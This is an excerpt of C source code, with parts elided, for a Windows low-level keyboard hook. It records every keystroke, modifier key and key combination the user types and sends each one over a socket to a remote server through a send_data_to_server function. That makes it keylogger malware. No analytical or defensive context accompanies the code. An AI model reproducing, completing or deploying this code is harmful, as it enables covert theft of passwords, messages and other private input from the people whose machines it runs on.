    ...
    if (nCode >= 0) {
        ...
        if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            ...
            if (pendingCtrl &&
                ...
                send_data_to_server(sock, L"Key", L"[CTRL]");
                pendingCtrl = FALSE;
            ...
            if (IsModifierKey(vkCode)) {
                if (!comboUsed) {
                    const wchar_t *modName = NULL;
                    if (vkCode == VK_LMENU || vkCode == VK_MENU)                       modName = L"[ALT]";
                    else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT) modName = L"[SHIFT]";
                    else if (vkCode == VK_LWIN || vkCode == VK_RWIN)                        modName = L"[WIN]";
                    else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL) modName = L"[CTRL]";

                    if (modName != NULL)
                        send_data_to_server(sock, L"Key", modName);
                }
        ...
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            ...
            if (isAltGrKey) {
                send_data_to_server(sock, L"Key", L"[ALTGR]");
                comboUsed = TRUE;
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            }
            ...
            BOOL isAltGrPressed = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0 ||
                ((kbdStruct->flags & LLKHF_EXTENDED) &&
            ...
            BOOL isWinPressed = ((GetAsyncKeyState(VK_LWIN) & 0x8000) != 0) ||
                ((GetAsyncKeyState(VK_RWIN) & 0x8000) != 0);
            ...
            if (!hasShortcutModifier && result > 0 && unicodeBuf[0] >= 32) {
                wchar_t unicodeStr[9] = { 0 };
                wcsncpy_s(unicodeStr, _countof(unicodeStr), unicodeBuf, result);
                send_data_to_server(sock, L"Key", unicodeStr);
                comboUsed = TRUE;
            }
            else {
                comboUsed = TRUE;
                ...
                wchar_t wComboBuf[64] = { 0 };
                MultiByteToWideChar(CP_ACP, 0, comboBuf, -1, wComboBuf, _countof(wComboBuf));

                send_data_to_server(sock, L"Key", wComboBuf);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
